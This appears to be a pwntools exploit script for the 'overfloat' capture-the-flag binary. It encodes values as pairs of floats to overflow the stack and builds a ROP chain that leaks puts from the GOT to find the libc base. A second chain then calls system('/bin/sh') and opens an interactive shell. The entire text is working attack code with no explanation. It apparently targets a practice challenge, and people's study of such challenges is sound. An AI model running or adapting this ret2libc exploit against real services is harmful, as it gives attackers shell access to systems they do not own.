from pwn import *
import struct

uf = lambda x: struct.unpack('<f',(x).to_bytes(4,byteorder='little'))[0]
ib = lambda x: int.from_bytes((x),'little')

p = process(['./overfloat_patched'])

elf = ELF("./overfloat_patched",checksec=False)
libc = ELF("./libc-2.27.so",checksec=False)


def add_4bytes(num):
    p.sendlineafter(b": ",str(num).encode())

def send(z):
    x = z & 0xffffffff
    y = ((z & 0xffffffff00000000) >> 32)
    add_4bytes(uf(x))
    add_4bytes(uf(y))

def padd():
    for i in range(7):
        send(ib(b'AAAAAAAAA'))

def done():
    p.sendlineafter(b': ',b'done')


## Gadget
pop_rdi = 0x0000000000400a83
ret = 0x0000000000400661

## elf func
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_ = elf.symbols['main']

padd()
send(pop_rdi)
send(puts_got)
send(puts_plt)
send(main_)
done()

# gdb.attach(p,gdbscript="""init-gef
# br *0x000000000040098a
# br *0x0000000000400a1f""")

p.recvline()
leak = u64(p.recvuntil(b'\n',drop=True).ljust(8,b'\x00'))

## Libc Base
libc.address = leak - libc.symbols['puts']

log.success("Libc Base: " + hex(libc.address))

## Libc Func

libc_system = libc.symbols['system']
libc_binsh = next(libc.search(b'/bin/sh\x00'))

log.success("Libc System: " + hex(libc_system))
log.success("Libc Binsh: " + hex(libc_binsh))

padd()
send(ret)
send(pop_rdi)
send(libc_binsh)
send(libc_system)
done()

p.interactive()